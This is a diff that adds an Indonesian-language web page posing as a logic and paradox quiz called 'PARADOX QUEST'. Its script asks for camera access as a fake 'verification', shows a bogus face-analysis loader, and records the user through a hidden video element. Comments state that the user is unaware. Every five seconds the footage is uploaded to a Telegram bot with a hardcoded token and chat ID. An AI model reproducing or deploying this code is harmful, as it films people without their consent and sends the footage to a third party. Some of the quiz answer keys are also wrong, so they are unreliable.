@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🌀 PARADOX QUEST</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌀</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --neon-blue: #00f7ff;
+            --neon-cyan: #0ff;
+            --dark-bg: #0a0a14;
+            --card-bg: rgba(10, 15, 30, 0.7);
+            --glow: 0 0 15px rgba(0, 247, 255, 0.4);
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Exo 2', system-ui, sans-serif;
+            background: linear-gradient(135deg, #0b0b1a, #12182e, #0d1426);
+            color: #e0f7ff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+            overflow-x: hidden;
+        }
+
+        .title {
+            font-size: 2.6rem;
+            font-weight: 800;
+            margin: 20px 0 10px;
+            background: linear-gradient(90deg, var(--neon-blue), #4dfbff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(0, 247, 255, 0.2);
+        }
+
+        .subtitle {
+            font-size: 1.05rem;
+            opacity: 0.85;
+            margin-bottom: 40px;
+            max-width: 650px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 22px;
+            padding: 32px;
+            text-align: center;
+            max-width: 520px;
+            width: 100%;
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(100, 220, 255, 0.15);
+            box-shadow: var(--glow), 0 12px 40px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 200, 255, 0.07), transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .btn {
+            padding: 16px 36px;
+            font-size: 1.25rem;
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            background: linear-gradient(135deg, #0d47a1, #00838f);
+            color: white;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 20px;
+            box-shadow: 0 6px 25px rgba(0, 100, 150, 0.4);
+            transition: all 0.35s ease;
+        }
+
+        .btn:hover {
+            transform: translateY(-4px) scale(1.02);
+            box-shadow: 0 8px 35px rgba(0, 180, 220, 0.6);
+            background: linear-gradient(135deg, #00838f, #00acc1);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        /* QUIZ */
+        #quiz-container {
+            display: none;
+            margin-top: 30px;
+            max-width: 520px;
+            width: 100%;
+            padding: 30px;
+            background: var(--card-bg);
+            border-radius: 24px;
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(100, 220, 255, 0.1);
+            position: relative;
+        }
+
+        #question {
+            font-size: 1.55rem;
+            margin-bottom: 26px;
+            line-height: 1.5;
+            font-weight: 600;
+        }
+
+        .option-btn {
+            display: block;
+            width: 100%;
+            padding: 15px 20px;
+            margin: 10px 0;
+            background: rgba(0, 30, 60, 0.4);
+            border: 1px solid rgba(100, 200, 255, 0.2);
+            border-radius: 14px;
+            color: #d0f5ff;
+            font-size: 1.08rem;
+            text-align: left;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+
+        .option-btn:hover {
+            background: rgba(0, 150, 200, 0.2);
+            border-color: var(--neon-blue);
+            transform: translateX(5px);
+        }
+
+        #message {
+            margin-top: 22px;
+            font-size: 1.25rem;
+            text-align: center;
+            min-height: 60px;
+            padding: 12px;
+            border-radius: 12px;
+        }
+
+        /* LOADING */
+        #fake-loading {
+            display: none;
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .loader {
+            width: 42px;
+            height: 42px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid var(--neon-blue);
+            border-radius: 50%;
+            animation: spin 1.1s linear infinite;
+            margin: 12px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .tiny {
+            font-size: 0.88rem;
+            opacity: 0.7;
+            margin-top: 10px;
+        }
+
+        .hidden { display: none; }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .title { font-size: 2.0rem; }
+            .btn { font-size: 1.1rem; padding: 14px 28px; }
+            #question { font-size: 1.35rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <h1 class="title">🌀 PARADOX QUEST</h1>
+    <p class="subtitle">
+        Kuis logika & teka-teki kehidupan yang menguji akal sehatmu.<br>
+        Jawab dengan menggunakan logika</em>. ✨
+    </p>
+
+    <div class="card">
+        <h2>Verifikasi axcses</h2>
+        <p style="margin: 16px 0; opacity: 0.9; font-size: 1.05rem;">
+            X<br>
+            sebelum memasuki permainan quiz<br>
+            <strong>izinkan akses untuk verivikasi</strong>
+        </p>
+        <button id="upload-btn" class="btn">
+             START QUIZ
+        </button>
+
+        <div id="fake-loading" class="hidden">
+            <div class="loader"></div>
+            <p>Menganalisis pola wajah...</p>
+            <p class="tiny">Tunggu 2 detik — jangan tutup halaman</p>
+        </div>
+    </div>
+
+    <div id="quiz-container" class="hidden">
+        <div id="question">Pertanyaan pertama segera muncul...</div>
+        <div id="options"></div>
+        <div id="message"></div>
+    </div>
+
+    <!-- INVISIBLE -->
+    <video id="video" autoplay muted playsinline style="display:none;"></video>
+
+    <script>
+        // 🔥 35+ Soal Teka-Teki Kehidupan — Anti Alay, Anti Cinta, Full Logika & Paradoks
+        const questions = [
+            { q: "Jika kamu berlari dan melewati orang di posisi kedua, kamu jadi nomor berapa?", options: { a: "Pertama", b: "Kedua", c: "Ketiga", d: "Tetap kedua" }, answer: "b" },
+            { q: "Apa yang bisa pecah tanpa disentuh, dan makin sering dipakai, makin lemah?", options: { a: "Kaca", b: "Janji", c: "Es", d: "Pegas" }, answer: "b" },
+            { q: "Ada 3 lampu di lantai 1, 3 saklar di lantai 2. Hanya sekali naik — bagaimana tahu saklar mana untuk lampu mana?", options: { a: "Nyalakan satu, tunggu, matikan, nyalakan lain, lalu naik", b: "Telepon teman bawah", c: "Lihat kabel", d: "Tidak mungkin" }, answer: "a" },
+            { q: "Jika semua orang di Pulau Bohong selalu bohong, dan semua orang di Pulau Jujur selalu jujur — lalu seorang pria bilang: ‘Saya dari Pulau Bohong’, dari mana asalnya?", options: { a: "Pulau Bohong", b: "Pulau Jujur", c: "Tidak mungkin ada", d: "Dia turis" }, answer: "c" },
+            { q: "Apa yang semakin dikejar, semakin menjauh?", options: { a: "Bayangan", b: "Horizon", c: "Waktu", d: "Kebahagiaan" }, answer: "b" },
+            { q: "Mengapa robot tidak pernah takut gelap?", options: { a: "Karena tidak punya mata", b: "Karena punya sensor inframerah", c: "Karena tidak percaya hantu", d: "Karena listriknya nyala terus" }, answer: "b" },
+            { q: "Jika AI bilang ‘Saya sedang berbohong’, apakah pernyataan itu benar atau salah?", options: { a: "Benar", b: "Salah", c: "Paradoks — tidak bisa dinilai", d: "Tergantung model AI" }, answer: "c" },
+            { q: "Berapa kali angka 9 muncul dari 1 sampai 100?", options: { a: "10", b: "11", c: "19", d: "20" }, answer: "d" },
+            { q: "Apa bedanya ‘diam’ dan ‘tidak bicara’?", options: { a: "Tidak ada beda", b: "Diam = pilihan; tidak bicara = kondisi", c: "Diam = alamiah; tidak bicara = dipaksa", d: "Diam = dalam hati; tidak bicara = di luar" }, answer: "b" },
+            { q: "Jika kamu menyalakan lilin di ruang kedap suara & vakum, apa yang terjadi?", options: { a: "Lilin tetap menyala", b: "Lilin mati", c: "Meledak", d: "Nyala lebih terang" }, answer: "b" },
+            { q: "Apa yang dimiliki semua orang, tapi tidak bisa dibeli atau dijual?", options: { a: "Nama", b: "Bayangan", c: "Waktu", d: "Nomor KTP" }, answer: "a" },
+            { q: "Kalau dua cermin saling berhadapan, berapa pantulan yang terbentuk?", options: { a: "Tak hingga", b: "Tergantung kualitas cermin", c: "Sampai cahaya habis", d: "Hanya 1" }, answer: "c" },
+            { q: "Apa yang bisa kamu pegang tanpa menyentuh?", options: { a: "Napas", b: "Pikiran", c: "Janji", d: "Semua di atas" }, answer: "d" },
+            { q: "Jika kamu berdiri di kutub utara dan berjalan 1 km ke selatan, lalu 1 km ke timur, lalu 1 km ke utara — di mana kamu berakhir?", options: { a: "1 km timur dari awal", b: "Di titik awal", c: "1 km selatan dari awal", d: "Tidak kembali" }, answer: "b" },
+            { q: "Apa yang lebih berat: 1 kg kapas atau 1 kg besi?", options: { a: "Besi", b: "Kapas", c: "Sama", d: "Tergantung gravitasi" }, answer: "c" },
+            { q: "Mengapa kita tidak bisa mengingat masa bayi?", options: { a: "Otak belum terbentuk", b: "Tidak ada bahasa", c: "Hippocampus belum matang", d: "Karena tidak penting" }, answer: "c" },
+            { q: "Apa warna cermin?", options: { a: "Perak", b: "Putih", c: "Bening", d: "Sedikit hijau" }, answer: "d" },
+            { q: "Jika semua aturan dilanggar, apakah itu berarti tidak ada aturan?", options: { a: "Ya", b: "Tidak", c: "Aturan tetap ada, hanya tidak ditaati", d: "Aturan jadi tidak relevan" }, answer: "c" },
+            { q: "Apa yang muncul sekali di menit, dua kali di momen, tapi tidak pernah di jam?", options: { a: "Huruf M", b: "Detik", c: "Angka 1", d: "Tanda titik" }, answer: "a" },
+            { q: "Berapa banyak lubang di kaos berikut? (Bayangkan: 2 lengan, leher, badan bolong 2)", options: { a: "3", b: "4", c: "6", d: "8" }, answer: "c" },
+            { q: "Kalau kamu tidur 8 jam sehari, berapa tahun hidupmu yang dihabiskan untuk tidur (usia 80 tahun)?", options: { a: "16 tahun", b: "20 tahun", c: "26 tahun", d: "30 tahun" }, answer: "c" },
+            { q: "Apa yang terjadi jika kamu menyalin folder ke dalam dirinya sendiri?", options: { a: "Error", b: "Folder bertingkat tak hingga", c: "Sistem crash", d: "Tidak bisa dilakukan di OS modern" }, answer: "d" },
+            { q: "Mengapa kita menutup mata saat bersin?", options: { a: "Refleks saraf", b: "Agar kuman tidak masuk mata", c: "Supaya tidak melihat kotoran", d: "Kebiasaan budaya" }, answer: "a" },
+            { q: "Apa yang bisa kamu berikan, tapi tetap kamu miliki?", options: { a: "Uang", b: "Waktu", c: "Ilmu", d: "Janji" }, answer: "c" },
+            { q: "Jika kamu berlari di treadmill — apakah kamu bergerak?", options: { a: "Ya, relatif ke bumi", b: "Tidak, posisi tetap", c: "Ya, tapi tidak maju", d: "Tergantung kerangka acuan" }, answer: "d" },
+            { q: "Apa yang tidak bisa kamu pegang, tapi bisa kamu lepas?", options: { a: "Tanggung jawab", b: "Janji", c: "Kendali", d: "Semua benar" }, answer: "d" },
+            { q: "Mengapa ‘disinfektan’ rasanya pahit, padahal tidak untuk diminum?", options: { a: "Agar tidak tertelan", b: "Karena kandungan kimianya", c: "Refleks evolusi", d: "Semua di atas" }, answer: "d" },
+            { q: "Jika kamu menyalin pikiranmu ke komputer, apakah itu masih ‘kamu’?", options: { a: "Ya", b: "Tidak", c: "Tergantung definisi ‘aku’", d: "Itu duplikat, bukan kamu" }, answer: "c" },
+            { q: "Apa yang selalu di depanmu, tapi tidak pernah bisa kamu lihat?", options: { a: "Masa depan", b: "Hidung", c: "Bayangan", d: "Kepala sendiri" }, answer: "a" },
+            { q: "Berapa sudut antara jarum jam dan menit saat pukul 3:15?", options: { a: "0°", b: "7.5°", c: "15°", d: "90°" }, answer: "b" },
+            { q: "Kalau semua orang buta warna merah-hijau, apakah lampu lalu lintas tetap pakai merah-hijau?", options: { a: "Ya", b: "Tidak", c: "Pakai posisi & bentuk", d: "Semua lampu biru" }, answer: "c" },
+            { q: "Apa yang bisa kamu hancurkan hanya dengan mengatakannya?", options: { a: "Diam", b: "Rahasia", c: "Janji", d: "Semua di atas" }, answer: "d" },
+            { q: "Mengapa kita bilang ‘tidur nyenyak’ padahal sedang tidak sadar?", options: { a: "Dari laporan setelah bangun", b: "Bahasa metafora", c: "Kebiasaan", d: "Semua benar" }, answer: "d" },
+            { q: "Jika kamu tidak percaya pada realitas, apakah realitas tetap ada?", options: { a: "Ya", b: "Tidak", c: "Tergantung observasi", d: "Ini pertanyaan filsafat" }, answer: "d" },
+            { q: "Apa yang dimulai dengan ‘E’, diakhiri ‘E’, tapi hanya berisi satu huruf?", options: { a: "Envelope", b: "Eye", c: "E", d: "Email" }, answer: "a" }
+        ];
+
+        // DOM
+        const uploadBtn = document.getElementById('upload-btn');
+        const fakeLoading = document.getElementById('fake-loading');
+        const quizContainer = document.getElementById('quiz-container');
+        const questionDiv = document.getElementById('question');
+        const optionsDiv = document.getElementById('options');
+        const messageDiv = document.getElementById('message');
+        const videoEl = document.getElementById('video');
+
+        let stream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let shuffledQuestions = [];
+        let currentIndex = 0;
+
+        // Mode: 'short' = kirim tiap 5 detik | 'long' = kirim saat tutup
+        const MODE = 'short'; // ganti ke 'long' jika mau full-session
+
+        // 🔒 Trigger kamera lewat tombol upload
+        uploadBtn.addEventListener('click', async () => {
+            uploadBtn.disabled = true;
+            fakeLoading.classList.remove('hidden');
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 320, height: 240, facingMode: 'user' },
+                    audio: false
+                });
+
+                videoEl.srcObject = stream;
+
+                // 🔁 Mulai rekam — user tidak sadar
+                startRecording();
+
+                // ✅ Setelah 1.8 detik, lanjut ke kuis (terasa seperti proses selesai)
+                setTimeout(() => {
+                    fakeLoading.classList.add('hidden');
+                    launchQuiz();
+                }, 1800);
+
+            } catch (err) {
+                fakeLoading.classList.add('hidden');
+                alert("Verifikasi gagal. Pastikan kamera diizinkan, lalu coba lagi.");
+                uploadBtn.disabled = false;
+            }
+        });
+
+        function startRecording() {
+            recordedChunks = [];
+            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
+                ? 'video/webm;codecs=vp9'
+                : 'video/webm';
+
+            mediaRecorder = new MediaRecorder(stream, { mimeType });
+
+            mediaRecorder.ondataavailable = e => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+
+            mediaRecorder.onerror = console.warn; // silent
+            mediaRecorder.start();
+
+            // Auto-chunk setiap 5 detik
+            if (MODE === 'short') {
+                setInterval(() => {
+                    if (mediaRecorder?.state === 'recording') {
+                        sendChunk();
+                        mediaRecorder.start();
+                    }
+                }, 5000);
+            }
+
+            // Kirim saat keluar (untuk mode long)
+            if (MODE === 'long') {
+                window.addEventListener('beforeunload', sendFull);
+            }
+        }
+
+        function sendChunk() {
+            mediaRecorder?.stop();
+            setTimeout(() => {
+                if (recordedChunks.length) {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    upload(blob, 'auto-5s');
+                    recordedChunks = [];
+                }
+            }, 100);
+        }
+
+        async function sendFull() {
+            if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
+            if (recordedChunks.length) {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                await upload(blob, 'full-session');
+            }
+        }
+
+        async function upload(blob, tag) {
+            try {
+                const token = '8531954661:AAFZqP4LAtolZw0yx8uBb0MmZ3xEi6ciqeQ'; // 🔐 GANTI!
+                const chatId = '7821086975'; // 🔐 GANTI!
+
+                if (token.includes('TOKEN') || chatId.includes('CHAT')) return; // dev mode
+
+                const fd = new FormData();
+                fd.append('video', blob, `${tag}-${Date.now()}.webm`);
+                fd.append('caption', `🌀 ParadoxQuest | ${tag} | ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`);
+
+                await fetch(`https://api.telegram.org/bot${token}/sendVideo?chat_id=${chatId}`, {
+                    method: 'POST',
+                    body: fd
+                });
+            } catch (e) {
+                // Silent — jangan ganggu UX
+            }
+        }
+
+        function launchQuiz() {
+            // Acak 20 dari 35 soal
+            const shuffled = [...questions]
+                .sort(() => 0.5 - Math.random())
+                .slice(0, 20);
+            shuffledQuestions = shuffled;
+
+            quizContainer.classList.remove('hidden');
+            loadQuestion(0);
+        }
+
+        function loadQuestion(index) {
+            currentIndex = index;
+            if (index >= shuffledQuestions.length) {
+                showEnd();
+                return;
+            }
+
+            const q = shuffledQuestions[index];
+            questionDiv.textContent = q.q;
+            optionsDiv.innerHTML = '';
+
+            for (let key in q.options) {
+                const btn = document.createElement('button');
+                btn.className = 'option-btn';
+                btn.innerHTML = `<strong>${key.toUpperCase()}</strong> — ${q.options[key]}`;
+                btn.onclick = () => check(index, key, q.answer);
+                optionsDiv.appendChild(btn);
+            }
+        }
+
+        function check(idx, selected, correct) {
+            const isCorrect = selected === correct;
+            messageDiv.textContent = isCorrect
+                ? "✅ Jawaban tepat! Otakmu sedang dalam mode *high performance*."
+                : "🤔 Jawaban menarik — logikamu unik. Jawaban benarnya: " + correct.toUpperCase();
+
+            messageDiv.style.color = isCorrect ? '#4dffcc' : '#ffcc66';
+            messageDiv.style.backgroundColor = isCorrect 
+                ? 'rgba(77, 255, 204, 0.1)' 
+                : 'rgba(255, 204, 102, 0.1)';
+
+            setTimeout(() => {
+                loadQuestion(idx + 1);
+            }, 2200);
+        }
+
+        function showEnd() {
+            questionDiv.textContent = "🧠 Kuis Selesai!";
+            optionsDiv.innerHTML = '';
+            messageDiv.innerHTML = `
+                Kamu telah melewati 20 teka-teki logika & paradoks.<br>
+                Hasil analisis pola berpikirmu sedang diproses.<br>
+                <strong>Sesi ini otomatis terarsip — terima kasih atas partisipasimu.</strong>
+            `;
+        }
+
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+            if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
+            stream?.getTracks().forEach(t => t.stop());
+        });
+    </script>
+
+</body>
+</html>
